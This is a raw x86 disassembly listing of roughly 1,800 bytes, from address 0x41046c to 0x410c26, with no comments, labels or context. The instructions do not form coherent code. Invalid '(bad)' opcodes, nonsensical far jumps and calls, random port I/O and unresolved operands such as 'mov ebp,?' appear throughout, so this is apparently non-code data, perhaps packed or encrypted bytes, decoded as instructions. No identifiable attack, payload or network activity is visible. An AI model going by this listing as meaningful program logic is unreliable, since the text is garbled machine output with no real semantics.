  41046c:	inc    edi
  41046d:	retf   0x6f8e
  410470:	inc    edx
  410471:	loop   0x4104b3
  410473:	cmp    al,0xf6
  410475:	aam    0x5
  410477:	mov    edx,0x58fe9389
  41047c:	bound  ebp,QWORD PTR [esi-0x43de3059]
  410482:	pop    esi
  410483:	mov    ah,cl
  410485:	xchg   ebx,eax
  410486:	sub    BYTE PTR ds:0x5d76fbb6,cl
  41048c:	inc    edx
  41048d:	pop    ebp
  41048e:	fist   WORD PTR [ecx+0x58893f3d]
  410494:	or     eax,0xde7874ea
  410499:	adc    cl,ah
  41049b:	(bad)  
  41049c:	cmc    
  41049d:	jge    0x4104c0
  41049f:	in     eax,dx
  4104a0:	inc    esi
  4104a1:	test   al,0xc9
  4104a3:	dec    edi
  4104a4:	push   ebp
  4104a5:	cmp    bl,cl
  4104a7:	xchg   DWORD PTR [edi-0xdac5548],esp
  4104ad:	mov    DWORD PTR [esi+0x6c],ebp
  4104b0:	rcr    DWORD PTR ds:0xb8f6,0xb4
  4104b6:	push   0x2a
  4104b8:	mov    eax,ss:0x58754f72
  4104be:	cwde   
  4104bf:	repz enter 0x6f7e,0x30
  4104c4:	dec    esp
  4104c5:	mov    dl,0x21
  4104c7:	add    DWORD PTR [ebp-0x17ff2fe0],ebp
  4104cd:	out    0x6e,eax
  4104cf:	dec    edi
  4104d0:	jmp    0x6e31:0xfab0b7d
  4104d7:	sub    eax,0x24bc0d9c
  4104dc:	ss cmp al,0x6
  4104df:	cmp    DWORD PTR [edx+0x74],ebp
  4104e2:	jo     0x410541
  4104e4:	pop    ebx
  4104e5:	jne    0x410550
  4104e7:	js     0x4104de
  4104e9:	adc    DWORD PTR [eax+0xd],esi
  4104ec:	repz xchg ecx,eax
  4104ee:	adc    DWORD PTR [eax+edi*4],ebp
  4104f1:	cmp    ecx,ecx
  4104f3:	pop    ecx
  4104f4:	jp     0x410567
  4104f6:	or     ah,al
  4104f8:	in     al,dx
  4104f9:	inc    eax
  4104fa:	outs   dx,DWORD PTR ds:[esi]
  4104fb:	xchg   BYTE PTR [eax-0x2],ah
  4104fe:	mov    cl,BYTE PTR [ebx+0x3c1349c0]
  410504:	retf   0x22bd
  410507:	rcr    DWORD PTR [esi],1
  410509:	xchg   edx,eax
  41050a:	xlat   BYTE PTR ds:[ebx]
  41050c:	mov    BYTE PTR [eax-0x7f181d92],ah
  410512:	and    BYTE PTR [edi],0x98
  410515:	hlt    
  410516:	xchg   edx,eax
  410517:	rol    esi,0x3b
  41051a:	jno    0x41053d
  41051c:	out    dx,al
  41051d:	test   eax,0x198a6b7f
  410522:	outs   dx,BYTE PTR ds:[esi]
  410523:	rcr    DWORD PTR ds:0xe8279074,cl
  410529:	jge    0x410531
  41052b:	loope  0x4104f2
  41052d:	mov    gs,WORD PTR [edi+0x2]
  410530:	mov    ch,0x76
  410532:	fwait
  410533:	cli    
  410534:	sub    dh,BYTE PTR [eax+0x51]
  410537:	or     esi,ebp
  410539:	imul   ecx,DWORD PTR [eax],0x3d6cce3a
  41053f:	rol    BYTE PTR [ebp+0x4738fe5f],cl
  410545:	adc    esp,0xfa29dc39
  41054b:	push   edi
  41054c:	out    dx,al
  41054d:	dec    edx
  41054e:	idiv   DWORD PTR [eax-0x45684720]
  410554:	and    eax,0x763868a7
  410559:	pusha  
  41055a:	mov    WORD PTR [ebp-0x6c],cs
  41055d:	or     DWORD PTR [ecx+0x70fdf567],0xcc0cdb82
  410567:	lea    edx,[esi]
  410569:	cmp    bh,bl
  41056b:	outs   dx,DWORD PTR ds:[esi]
  41056c:	ror    BYTE PTR [edx],0x8d
  41056f:	(bad)  
  410570:	div    BYTE PTR [ecx-0x5f37193e]
  410576:	outs   dx,BYTE PTR ds:[esi]
  410577:	aaa    
  410578:	pop    esi
  410579:	test   DWORD PTR [esi-0x54443eaa],ebx
  41057f:	sbb    edx,ebp
  410581:	inc    edx
  410582:	iret   
  410583:	mov    eax,0xda87c92b
  410588:	or     DWORD PTR [ebp+0x6f],ebx
  41058b:	pop    ss
  41058c:	pusha  
  41058d:	xchg   BYTE PTR [eax-0x30],ah
  410590:	fmul   QWORD PTR [ebp+0x1e]
  410593:	int    0x5e
  410595:	cmp    dh,BYTE PTR [ebx+0x328921d2]
  41059b:	(bad)  
  41059c:	aad    0x79
  41059e:	dec    ecx
  41059f:	jmp    0x5a472a99
  4105a4:	and    bx,WORD PTR [edi+0x52]
  4105a8:	xor    edi,DWORD PTR [edx]
  4105aa:	les    ebx,FWORD PTR [edi+ecx*4-0x4aa83bd1]
  4105b1:	sub    esi,esi
  4105b3:	test   BYTE PTR [ecx],0x16
  4105b6:	jns    0x4105bc
  4105b8:	call   0x55b80e58
  4105bd:	loopne 0x410619
  4105bf:	mov    al,ds:0xf3543bfb
  4105c4:	repz imul edi,DWORD PTR [eax-0x7dfeb3bd],0xa9ee1d5e
  4105cf:	in     al,0x31
  4105d1:	adc    edi,DWORD PTR [ebx]
  4105d3:	pop    ecx
  4105d4:	cwde   
  4105d5:	sbb    ebp,DWORD PTR [edi]
  4105d7:	cmp    DWORD PTR [ebx+0x5d],esi
  4105da:	xchg   ebp,eax
  4105db:	pop    ebp
  4105dc:	outs   dx,BYTE PTR ds:[esi]
  4105dd:	push   eax
  4105de:	jnp    0x41056b
  4105e0:	not    bh
  4105e2:	mov    eax,0x91d39a2f
  4105e7:	adc    eax,0x394d5815
  4105ec:	push   cs
  4105ed:	out    0xaf,al
  4105ef:	(bad)  [esi]
  4105f1:	fnsave [ecx]
  4105f3:	dec    ecx
  4105f4:	in     al,dx
  4105f5:	sbb    BYTE PTR [edx-0x4e],ch
  4105f8:	shl    ebp,1
  4105fa:	dec    esi
  4105fb:	adc    al,0xb1
  4105fd:	pop    ebx
  4105fe:	(bad)  
  4105ff:	cmp    ah,cl
  410601:	and    edi,DWORD PTR [eax]
  410603:	call   0x8cf5:0x4ee407e8
  41060a:	pop    esp
  41060b:	pop    es
  41060c:	imul   ecx,DWORD PTR [edx+0x21],0x22
  410610:	pop    ds
  410611:	cmp    BYTE PTR [edx-0x40],dl
  410614:	jle    0x4105bd
  410616:	ja     0x4105b8
  410618:	push   ebx
  410619:	jg     0x41067c
  41061b:	add    ch,dh
  41061d:	loopne 0x4105b3
  41061f:	mov    ebp,0x6bb9dd97
  410624:	sbb    al,0x38
  410626:	and    BYTE PTR [edi+0x14],bh
  410629:	test   DWORD PTR [esi+0x6f6dafb0],0x223d821f
  410633:	outs   dx,BYTE PTR ds:[esi]
  410634:	pop    ebx
  410635:	out    0xcb,al
  410637:	test   al,0xd7
  410639:	cmp    edi,DWORD PTR [ecx-0x7e]
  41063c:	cdq    
  41063d:	nop
  41063e:	xchg   ebx,eax
  41063f:	aam    0x1e
  410641:	test   BYTE PTR [esi-0x11],ch
  410644:	mov    ebp,0x8e1b074b
  410649:	je     0x410699
  41064b:	cmp    eax,ecx
  41064d:	fs mov ecx,0xbbc0ddc2
  410653:	mov    bl,0xf5
  410655:	imul   edi,DWORD PTR [eax+ebx*4-0x32],0xae05a322
  41065d:	cmp    ebp,eax
  41065f:	and    BYTE PTR ds:0xc18a2a8f,ah
  410665:	fs jbe 0x410647
  410668:	dec    edx
  410669:	cmc    
  41066a:	fs jle 0x410628
  41066d:	xor    al,0x12
  41066f:	cmp    DWORD PTR [eax+0x12],esi
  410672:	(bad)  
  410673:	scas   eax,DWORD PTR es:[edi]
  410674:	inc    edi
  410675:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410676:	xchg   ebx,eax
  410677:	(bad)  
  410678:	xlat   BYTE PTR ds:[ebx]
  410679:	add    cl,BYTE PTR [ebx-0x30319647]
  41067f:	cmp    bh,ch
  410681:	test   esp,edx
  410683:	lock aam 0xd3
  410686:	outs   dx,BYTE PTR ds:[esi]
  410687:	or     BYTE PTR [ecx+0x23],dl
  41068a:	xchg   esp,eax
  41068b:	cld    
  41068c:	test   eax,0xdf1ae3fa
  410691:	xor    ebx,ecx
  410693:	mov    ebp,0x7e2f753d
  410698:	sbb    edx,ebp
  41069a:	push   esp
  41069b:	imul   eax,ebx,0xe8197275
  4106a1:	cs retf 
  4106a3:	mov    eax,0xb43915cb
  4106a8:	loope  0x41066a
  4106aa:	jge    0x4106b8
  4106ac:	cmc    
  4106ad:	adc    eax,0x2ed18a1e
  4106b2:	push   esi
  4106b3:	dec    eax
  4106b4:	cmc    
  4106b5:	jns    0x41065a
  4106b7:	sub    al,0xb
  4106b9:	repz iret 
  4106bb:	inc    esi
  4106bc:	dec    ebx
  4106bd:	xor    DWORD PTR [ebp-0x2f],eax
  4106c0:	sub    BYTE PTR [eax-0x1c],bh
  4106c3:	cli    
  4106c4:	xor    eax,0x5d40fe9b
  4106c9:	push   cs
  4106ca:	outs   dx,BYTE PTR ds:[esi]
  4106cb:	push   ds
  4106cc:	iret   
  4106cd:	dec    ebx
  4106ce:	jg     0x410653
  4106d0:	rcr    BYTE PTR [edx*4-0x1cc100cd],1
  4106d7:	daa    
  4106d8:	ins    BYTE PTR es:[edi],dx
  4106d9:	push   0xcc63d12c
  4106de:	outs   dx,BYTE PTR ds:[esi]
  4106df:	dec    ebp
  4106e0:	(bad)  
  4106e1:	retf   0x5987
  4106e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4106e5:	inc    ebp
  4106e6:	xchg   ecx,eax
  4106e7:	cmp    BYTE PTR [eax-0x54ead06a],ch
  4106ed:	mov    edi,0x6ef56e08
  4106f2:	mov    ebp,0xb33a0bac
  4106f7:	push   es
  4106f8:	aam    0x3b
  4106fa:	pop    esi
  4106fb:	out    0x55,al
  4106fd:	ins    BYTE PTR es:[edi],dx
  4106fe:	add    DWORD PTR [eax+edi*4-0x15],eax
  410702:	outs   dx,BYTE PTR ds:[esi]
  410703:	out    dx,eax
  410704:	jecxz  0x410770
  410706:	jmp    0x4106bc
  410708:	ins    BYTE PTR es:[edi],dx
  410709:	call   DWORD PTR [edx-0x17d07ec8]
  41070f:	inc    eax
  410710:	jp     0x410780
  410712:	lods   al,BYTE PTR ds:[esi]
  410713:	dec    ebp
  410714:	leave  
  410715:	pop    ds
  410716:	outs   dx,BYTE PTR ds:[esi]
  410717:	in     eax,dx
  410718:	sahf   
  410719:	daa    
  41071a:	push   0x95bd2604
  41071f:	cmp    BYTE PTR [edx-0x228506f6],ah
  410725:	pop    ebx
  410726:	ja     0x410732
  410728:	cmc    
  410729:	out    0x5a,al
  41072b:	xlat   BYTE PTR ds:[ebx]
  41072c:	pop    edx
  41072d:	imul   edi,DWORD PTR [ebp-0x62],0xc5663849
  410734:	lds    ecx,FWORD PTR [esi]
  410736:	and    eax,0xb2962969
  41073b:	sub    BYTE PTR [ebp+0x1d52283b],cl
  410741:	dec    ebp
  410742:	mov    bh,0xd
  410744:	or     al,0x38
  410746:	fs mov bh,0x1a
  410749:	ds mov cl,0x85
  41074c:	jnp    0x41078a
  41074e:	outs   dx,BYTE PTR ds:[esi]
  41074f:	ja     0x410773
  410751:	in     eax,dx
  410752:	(bad)  
  410753:	pusha  
  410754:	mul    BYTE PTR [ecx-0x64]
  410757:	sbb    ah,BYTE PTR ds:0x5238aad2
  41075d:	addr16 ds call 0x3827:0xf9a2a3f4
  410766:	jnp    0x410797
  410768:	shl    BYTE PTR [ebp+0x51],0x32
  41076c:	out    dx,eax
  41076d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41076e:	cwde   
  41076f:	cmp    BYTE PTR [ebp-0x54a75345],ah
  410775:	push   edi
  410776:	xchg   edx,eax
  410777:	fs jnp 0x41072a
  41077a:	jge    0x41073f
  41077c:	sub    BYTE PTR [ecx+ebx*1+0x5c3bcd2d],cl
  410783:	sub    ebx,DWORD PTR [edx]
  410785:	mov    ch,0x17
  410787:	push   ecx
  410788:	mov    al,0x3b
  41078a:	fmul   DWORD PTR [ebp+0x74]
  41078d:	addr16 cwde 
  41078f:	xchg   BYTE PTR ds:0x689c961f,ch
  410795:	jle    0x410806
  410797:	ss and eax,0x99308f77
  41079d:	fld    TBYTE PTR [ebx]
  41079f:	cmp    DWORD PTR [ebp+0x7e1e2284],ecx
  4107a5:	adc    edx,esi
  4107a7:	mov    ebp,?
  4107a9:	int3   
  4107aa:	push   ebx
  4107ab:	mov    BYTE PTR [esi+0x3],al
  4107ae:	xor    BYTE PTR [esi+0x1b],ah
  4107b1:	cmp    dh,BYTE PTR [ebp+0x5c]
  4107b4:	and    dh,BYTE PTR [edi]
  4107b6:	jb     0x41081d
  4107b8:	aad    0xc9
  4107ba:	xchg   esi,eax
  4107bb:	pop    edx
  4107bc:	not    BYTE PTR [esi+0x6c]
  4107bf:	push   edi
  4107c0:	je     0x4107c6
  4107c2:	retf   
  4107c3:	int3   
  4107c4:	mov    eax,ds:0x50c57d0e
  4107c9:	cmp    BYTE PTR [eax+esi*4+0x5c629f21],al
  4107d0:	(bad)  
  4107d1:	push   ebx
  4107d2:	outs   dx,DWORD PTR ds:[esi]
  4107d3:	ss out dx,al
  4107d5:	dec    ebp
  4107d6:	fsubrp st(0),st
  4107d8:	bound  edx,QWORD PTR [edi+0x661938ba]
  4107de:	mov    BYTE PTR [edx],bl
  4107e0:	jmp    0x4107db
  4107e2:	xchg   ebp,eax
  4107e3:	icebp  
  4107e4:	jg     0x4107e4
  4107e6:	imul   ecx,DWORD PTR [ebx-0x46],0xedff565a
  4107ed:	inc    eax
  4107ee:	stos   DWORD PTR es:[edi],eax
  4107ef:	push   esi
  4107f0:	dec    ebx
  4107f1:	pop    DWORD PTR [esi+0x1]
  4107f4:	imul   DWORD PTR [edi-0xf44f5c9]
  4107fa:	mov    ebp,0x284d5d8
  4107ff:	cmp    DWORD PTR [esi],esi
  410801:	push   ebp
  410802:	xor    eax,0xbc4a0bee
  410807:	add    esi,ebp
  410809:	call   0x479c:0x9906f409
  410810:	push   ebx
  410811:	cmp    BYTE PTR [edi-0x40],al
  410814:	sar    DWORD PTR ds:0x8e8a93e7,cl
  41081a:	outs   dx,BYTE PTR ds:[esi]
  41081b:	fcomp  DWORD PTR [esi]
  41081d:	or     al,0xbd
  41081f:	jge    0x4107c0
  410821:	sub    esp,DWORD PTR [ecx+0x61f17f38]
  410827:	add    DWORD PTR [ecx+eax*2+0x12f552da],edi
  41082e:	jo     0x41089f
  410830:	sub    DWORD PTR [ecx],ebx
  410832:	pop    es
  410833:	loope  0x410881
  410835:	sub    DWORD PTR [ebx-0x62],ecx
  410838:	inc    ebx
  410839:	cmp    dl,al
  41083b:	add    dh,BYTE PTR [ebx+0x1db77427]
  410841:	dec    esi
  410842:	outs   dx,DWORD PTR ds:[esi]
  410843:	sub    bl,BYTE PTR [eax-0x21]
  410846:	xor    al,0x4f
  410848:	fnsave [edx]
  41084a:	adc    eax,0x3bd35c18
  41084f:	stc    
  410850:	div    esp
  410852:	scas   al,BYTE PTR es:[edi]
  410853:	icebp  
  410854:	pop    ss
  410855:	and    eax,0x251899a3
  41085a:	outs   dx,DWORD PTR ds:[esi]
  41085b:	push   edx
  41085c:	xor    al,0xe
  41085e:	add    bh,ah
  410860:	mov    esp,0xe038e9b1
  410865:	sub    al,BYTE PTR [ecx-0x45]
  410868:	int    0x4c
  41086a:	fild   WORD PTR [esi*8+0x38aba8df]
  410871:	jne    0x41086f
  410873:	jg     0x4108c3
  410875:	hlt    
  410876:	inc    edx
  410877:	adc    ebp,esi
  410879:	inc    edi
  41087a:	mov    ch,0xde
  41087c:	push   esp
  41087d:	mov    eax,0x5d037e19
  410882:	(bad)  [ecx]
  410884:	in     al,dx
  410885:	es mov al,0x99
  410888:	ret    
  410889:	mov    ebx,0xfe9f18f1
  41088e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41088f:	cmp    BYTE PTR [edi-0x22dbfbb],dl
  410895:	daa    
  410896:	and    DWORD PTR [edi],ebx
  410898:	cmc    
  410899:	mov    ebp,0xf90b533a
  41089e:	mov    dh,BYTE PTR ds:0x78cd386d
  4108a4:	mov    al,ds:0x231609e2
  4108a9:	sub    BYTE PTR [esi-0x8],0x9c
  4108ad:	xor    dl,BYTE PTR [ebx]
  4108af:	popa   
  4108b0:	cmp    DWORD PTR [edx+0x16713f50],esi
  4108b6:	aas    
  4108b7:	rcl    BYTE PTR [edx],1
  4108b9:	xlat   BYTE PTR ds:[ebx]
  4108ba:	scas   al,BYTE PTR es:[edi]
  4108bb:	and    BYTE PTR [eax-0xe],al
  4108be:	lea    edi,[ebp+0x266a100f]
  4108c4:	out    0x8,eax
  4108c6:	push   cs
  4108c7:	pop    eax
  4108c8:	sbb    ch,bl
  4108ca:	ret    
  4108cb:	into   
  4108cc:	dec    ebx
  4108cd:	push   0xbe71bfef
  4108d2:	outs   dx,BYTE PTR ds:[esi]
  4108d3:	ret    
  4108d4:	repz jne 0x41089b
  4108d7:	mov    ?,WORD PTR [eax-0x3dc76587]
  4108dd:	push   ds
  4108de:	push   esp
  4108df:	mov    dh,0x17
  4108e1:	dec    edi
  4108e2:	push   esp
  4108e3:	call   0x581fcddd
  4108e8:	mov    eax,0xae8460a2
  4108ed:	cmp    esp,DWORD PTR [esi+0x796e9c8c]
  4108f3:	outs   dx,DWORD PTR ds:[esi]
  4108f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4108f5:	les    ebp,FWORD PTR [esi-0x2e]
  4108f8:	ins    BYTE PTR es:[edi],dx
  4108f9:	cmp    eax,0x34d4fa26
  4108fe:	enter  0x4438,0xe6
  410902:	xor    al,0xf7
  410904:	out    dx,eax
  410905:	cs inc ebp
  410907:	mov    ebp,0x696e1d7f
  41090c:	pop    es
  41090d:	or     eax,0x271a5b09
  410912:	fnstsw WORD PTR [eax]
  410914:	push   ds
  410915:	fstp   TBYTE PTR [edx+0x53]
  410918:	xchg   ecx,eax
  410919:	clc    
  41091a:	xor    al,0xaf
  41091c:	cmc    
  41091d:	inc    eax
  41091e:	shl    DWORD PTR [ebx+0x57c5b3f3],0x20
  410925:	cmp    BYTE PTR [edx+0x5e702f05],al
  41092b:	inc    edi
  41092c:	jns    0x41090f
  41092e:	imul   esi,DWORD PTR [ecx+eax*2],0x1b20e3e
  410935:	test   DWORD PTR ds:0x873a7598,ecx
  41093b:	inc    edi
  41093c:	cli    
  41093d:	or     bl,ah
  41093f:	cmc    
  410940:	xchg   DWORD PTR [esi+ecx*8],edx
  410943:	sbb    eax,0x9c9728dd
  410948:	test   DWORD PTR [edx+0x14],0xfad43c7a
  41094f:	clc    
  410950:	ret    
  410951:	mov    ebp,0x3bc24f4d
  410956:	ror    BYTE PTR [ebp-0xf63eec8],1
  41095c:	(bad)  
  41095e:	pop    esp
  41095f:	(bad)  
  410960:	cmc    
  410961:	stos   BYTE PTR es:[edi],al
  410962:	mov    esi,0x7a1d1187
  410967:	stos   BYTE PTR es:[edi],al
  410968:	push   edx
  410969:	cmp    bh,bh
  41096b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41096c:	mov    esp,0x2ca66247
  410971:	and    ebp,DWORD PTR [edi-0x7e]
  410974:	sub    DWORD PTR [eax+eax*4+0x2c19f632],edi
  41097b:	cmp    DWORD PTR [edi-0x2ce68e91],edi
  410981:	cdq    
  410982:	mov    eax,DWORD PTR ds:0xb3b8b0f5
  410988:	mov    ah,0x8c
  41098a:	cmp    DWORD PTR [eax+0x393355c9],ebp
  410990:	imul   esp,DWORD PTR ds:0xb5f990b5,0x9bf5ddc6
  41099a:	mov    ebp,0x506436e1
  41099f:	icebp  
  4109a0:	mov    al,ds:0xf03e303c
  4109a5:	cwde   
  4109a6:	ret    
  4109a7:	pop    edx
  4109a8:	jne    0x4109ff
  4109aa:	pop    eax
  4109ab:	in     eax,dx
  4109ac:	in     al,dx
  4109ad:	mov    cl,0x1f
  4109af:	mov    edx,0xd07ee239
  4109b4:	jns    0x41096c
  4109b6:	fdivr  DWORD PTR [eax]
  4109b8:	div    eax
  4109ba:	fbld   TBYTE PTR ds:0xc928db4c
  4109c0:	cmc    
  4109c1:	pop    edx
  4109c2:	ror    DWORD PTR [ebp-0x7038034],0xc
  4109c9:	cmp    BYTE PTR [edx+esi*1],dh
  4109cc:	mov    ch,BYTE PTR [ebp+0x2108703f]
  4109d2:	outs   dx,DWORD PTR ds:[esi]
  4109d3:	push   eax
  4109d4:	mov    ah,0x66
  4109d6:	mov    al,0x7
  4109d8:	sbb    eax,0x7f3615c3
  4109dd:	or     eax,0xccf5a7c1
  4109e2:	iret   
  4109e3:	clc    
  4109e4:	jmp    0x95b:0x3d016ea0
  4109eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4109ec:	std    
  4109ed:	push   ecx
  4109ee:	push   ds
  4109ef:	cmp    DWORD PTR [esi],ebp
  4109f1:	out    dx,al
  4109f2:	pop    esi
  4109f3:	ins    BYTE PTR es:[edi],dx
  4109f4:	sti    
  4109f5:	push   edx
  4109f6:	pop    ebp
  4109f7:	mov    ds:0x659bcef5,al
  4109fc:	mov    ss,edi
  4109fe:	xchg   esp,eax
  4109ff:	das    
  410a00:	pop    es
  410a01:	cmp    esp,DWORD PTR [esi+0x5ad71f4f]
  410a07:	push   cs
  410a08:	xchg   edx,eax
  410a09:	jp     0x410a84
  410a0b:	pop    esp
  410a0c:	xchg   ch,bl
  410a0e:	adc    bl,0xd9
  410a11:	jmp    FWORD PTR [esi]
  410a13:	ret    
  410a14:	push   eax
  410a15:	addr16 jo 0x4109c9
  410a18:	jns    0x410a52
  410a1a:	fwait
  410a1b:	lods   al,BYTE PTR ds:[esi]
  410a1c:	and    edx,DWORD PTR [ebx+0x38]
  410a1f:	push   es
  410a20:	push   cs
  410a21:	add    ch,BYTE PTR [esi-0x38]
  410a24:	add    BYTE PTR gs:[esi-0x5a511610],0x38
  410a2c:	cmp    ebp,eax
  410a2e:	test   eax,0x3be3ce0f
  410a33:	push   edi
  410a35:	sub    eax,0x812196b9
  410a3a:	jns    0x410a94
  410a3c:	das    
  410a3d:	xor    ah,al
  410a3f:	sub    ecx,DWORD PTR [edx]
  410a41:	inc    ecx
  410a42:	xchg   edi,eax
  410a43:	aad    0x75
  410a45:	inc    ebp
  410a46:	inc    edi
  410a47:	jae    0x410a71
  410a49:	push   ss
  410a4a:	and    BYTE PTR [ebp+0x572f2295],0x83
  410a51:	cdq    
  410a52:	pop    esi
  410a53:	adc    al,0xe
  410a55:	cmp    BYTE PTR [ebp-0x31224015],bl
  410a5b:	repnz sbb ch,dl
  410a5e:	imul   edx,DWORD PTR [eax],0x4f2c6c5c
  410a64:	std    
  410a65:	imul   edx,DWORD PTR [edi],0x13
  410a68:	data16 cmp BYTE PTR [ebx+0x50],ah
  410a6c:	stos   DWORD PTR es:[edi],eax
  410a6d:	and    bh,dh
  410a6f:	loope  0x410a96
  410a71:	add    DWORD PTR [esi-0x41],ebp
  410a74:	mov    cl,0xa8
  410a76:	pop    esi
  410a77:	in     eax,dx
  410a78:	mov    edi,0x4c390b5c
  410a7d:	jns    0x410a80
  410a7f:	xor    ecx,DWORD PTR [ecx+0x77]
  410a82:	xor    ecx,ebp
  410a84:	xor    edx,DWORD PTR [edi]
  410a86:	xchg   DWORD PTR [eax],edi
  410a88:	inc    esi
  410a89:	mov    cl,0x72
  410a8b:	neg    DWORD PTR ss:[ebx]
  410a8e:	mov    DWORD PTR [eax],edi
  410a90:	sub    al,0xef
  410a92:	adc    dl,bl
  410a94:	xchg   edi,eax
  410a95:	scas   eax,DWORD PTR es:[edi]
  410a96:	aas    
  410a97:	inc    esi
  410a98:	jns    0x410ac8
  410a9a:	push   0x2a
  410a9c:	cld    
  410a9d:	sbb    esi,DWORD PTR [ecx+0x2d407a08]
  410aa3:	sub    dh,bl
  410aa5:	in     eax,0x10
  410aa7:	push   es
  410aa8:	jne    0x410a8c
  410aaa:	(bad)  
  410aab:	ss or  eax,0xf5802323
  410ab1:	jnp    0x410af8
  410ab3:	cwde   
  410ab4:	push   ebp
  410ab5:	cli    
  410ab6:	mov    edx,0x2c387370
  410abb:	outs   dx,BYTE PTR ds:[esi]
  410abc:	lahf   
  410abd:	mov    ebx,0x30700784
  410ac2:	outs   dx,BYTE PTR ds:[esi]
  410ac3:	arpl   WORD PTR [esi+0x7d],bx
  410ac6:	nop
  410ac7:	jno    0x410ada
  410ac9:	pop    ds
  410aca:	inc    esp
  410acb:	lds    eax,FWORD PTR [esi-0x42d826c5]
  410ad1:	pop    esi
  410ad2:	push   ebp
  410ad3:	nop
  410ad4:	imul   eax,DWORD PTR [esi+0x6f],0xf510b8b0
  410adb:	mov    eax,0x39cc8677
  410ae0:	pusha  
  410ae1:	inc    esp
  410ae2:	mov    al,ds:0xfbce8807
  410ae7:	je     0x410acb
  410ae9:	fwait
  410aea:	outs   dx,BYTE PTR ds:[esi]
  410aeb:	inc    edx
  410aec:	inc    esp
  410aed:	pop    esi
  410aee:	ins    BYTE PTR es:[edi],dx
  410aef:	scas   al,BYTE PTR es:[edi]
  410af0:	push   ebx
  410af1:	push   ss
  410af2:	das    
  410af3:	sbb    bh,BYTE PTR [ebx-0x7407275d]
  410af9:	xchg   edi,eax
  410afa:	jl     0x410b4d
  410afc:	dec    edx
  410afd:	push   esp
  410afe:	arpl   WORD PTR [edx-0x16],di
  410b01:	fcmovnb st,st(5)
  410b03:	mov    ebx,0x64eeab1b
  410b08:	rcr    BYTE PTR [edi+0x384dba79],cl
  410b0e:	test   DWORD PTR [esi],ecx
  410b10:	adc    eax,0x744c3c70
  410b15:	jne    0x410aac
  410b17:	mov    ds,WORD PTR [ecx-0x18]
  410b1a:	lods   eax,DWORD PTR ds:[esi]
  410b1b:	aas    
  410b1c:	dec    edi
  410b1d:	add    BYTE PTR [ebp+0x523b7f83],dl
  410b23:	jno    0x410af9
  410b25:	bound  ebx,QWORD PTR [ebx+0x305c4609]
  410b2b:	mov    ah,0x32
  410b2d:	mov    bh,0x90
  410b2f:	mov    eax,0xadb8bb03
  410b34:	popa   
  410b35:	inc    ebp
  410b36:	dec    edi
  410b37:	cmp    DWORD PTR [eax],edi
  410b39:	fwait
  410b3a:	xchg   ebp,eax
  410b3b:	loopne 0x410ae9
  410b3d:	add    eax,0xadf54a02
  410b42:	cs xchg ebp,eax
  410b44:	into   
  410b45:	(bad)  
  410b46:	cld    
  410b47:	xchg   ebx,eax
  410b48:	fs cmp al,cl
  410b4b:	mul    BYTE PTR ds:0x33e7528b
  410b51:	jae    0x410bc9
  410b53:	jmp    0x61851e72
  410b58:	push   ebx
  410b59:	xor    DWORD PTR [edx],esi
  410b5b:	add    esi,0xcda102ec
  410b61:	cs mov esp,0xe91ad538
  410b67:	addr16 mov ds:0xe77c,eax
  410b6b:	imul   esi,ebp,0x958daae9
  410b71:	ret    0x6013
  410b74:	sti    
  410b75:	cmp    edi,ebp
  410b77:	clc    
  410b78:	pop    edi
  410b79:	mov    ecx,0xb2103295
  410b7e:	add    eax,0x2060ccf9
  410b83:	clc    
  410b84:	inc    ebp
  410b85:	dec    ebx
  410b86:	outs   dx,DWORD PTR ds:[esi]
  410b87:	(bad)  
  410b88:	lea    eax,[edi+0x68]
  410b8b:	stos   DWORD PTR es:[edi],eax
  410b8c:	cs jle 0x410bae
  410b8f:	jg     0x410b86
  410b91:	dec    esi
  410b92:	jno    0x410c10
  410b94:	mov    ah,0x1
  410b96:	mov    esi,0x583b8f7d
  410b9b:	ret    
  410b9c:	jbe    0x410b8a
  410b9e:	repnz in al,0x99
  410ba1:	mov    ch,BYTE PTR [esi-0x52]
  410ba4:	xor    ebp,DWORD PTR [eax-0x495b2dc2]
  410baa:	adc    dh,BYTE PTR ds:0xe65b3b5d
  410bb0:	xor    ebx,DWORD PTR [eax-0x28]
  410bb3:	mov    edx,0x52ee69f5
  410bb8:	mov    cl,0xca
  410bba:	add    ecx,DWORD PTR [ecx]
  410bbc:	dec    ebx
  410bbd:	cmp    BYTE PTR [ebx-0x52],ch
  410bc0:	pop    ss
  410bc1:	fisttp WORD PTR [esi]
  410bc3:	sbb    edi,ecx
  410bc5:	in     eax,dx
  410bc6:	jne    0x410c17
  410bc8:	cmp    ebp,DWORD PTR [ebx]
  410bca:	mov    es,WORD PTR [ebp+0x15]
  410bcd:	popf   
  410bce:	(bad)  
  410bcf:	imul   eax,ebp,0x3b
  410bd2:	sbb    al,0x45
  410bd4:	mov    DWORD PTR [eax-0x7e],ebx
  410bd7:	in     al,0xd2
  410bd9:	arpl   WORD PTR [edi-0x4f],bp
  410bdc:	rcl    BYTE PTR [eax+0x48ee8637],0xc
  410be3:	cmp    DWORD PTR [eax],esi
  410be5:	fcomi  st,st(1)
  410be7:	aas    
  410be8:	hlt    
  410be9:	xchg   ecx,eax
  410bea:	xlat   BYTE PTR ds:[ebx]
  410beb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410bec:	adc    al,0xc
  410bee:	lods   eax,DWORD PTR ds:[esi]
  410bef:	push   es
  410bf0:	repz data16 mov bh,0x38
  410bf4:	mov    ebx,0x5d8086c1
  410bf9:	inc    eax
  410bfa:	push   ss
  410bfb:	cmp    ecx,ebx
  410bfd:	cwde   
  410bfe:	adc    esp,DWORD PTR [ebx+0x5b9e6a08]
  410c04:	cmc    
  410c05:	sub    DWORD PTR [edx+0x7a],0xffffffbb
  410c09:	(bad)  
  410c0b:	jb     0x410bac
  410c0d:	cmp    ecx,DWORD PTR [eax+0x3ec0210a]
  410c13:	ins    DWORD PTR es:[edi],dx
  410c14:	sbb    ch,BYTE PTR [ebx-0x4109d51e]
  410c1a:	and    al,0x55
  410c1c:	inc    edx
  410c1d:	sub    eax,0xe15eb31
  410c22:	sbb    al,0x39
  410c24:	cld    
  410c25:	cwde   
  410c26:	add    al,0x32
